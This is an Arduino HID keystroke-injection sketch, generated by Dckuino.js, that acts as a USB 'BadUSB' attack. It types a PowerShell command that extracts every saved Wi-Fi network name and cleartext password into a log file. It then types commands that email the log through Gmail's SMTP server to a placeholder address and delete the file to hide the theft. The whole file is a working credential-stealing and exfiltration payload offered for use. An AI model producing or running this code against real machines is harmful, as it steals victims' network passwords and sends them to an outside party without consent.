/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // ---------------------Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);

  Keyboard.print("PowerShell -NoLogo");

  delay(300);

  // -windowstyle Minimized
  typeKey(KEY_RETURN);

  delay(300);

  // to capture the ssid and password and save it in log.txt file
  Keyboard.print("$(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > Log.txt");

  // ---------------------to send the mail
  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR EMAIL', 'EMAIL PASS');");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'FROM EMAIL'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('TO EMAIL')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = 'ALL SSID AND PASS'");

  typeKey(KEY_RETURN);

  // STRING $ReportEmail.Body = 'Attached is your duck report.'
  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // ---------------------delete and end
  Keyboard.print("del Log.txt & exit");

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
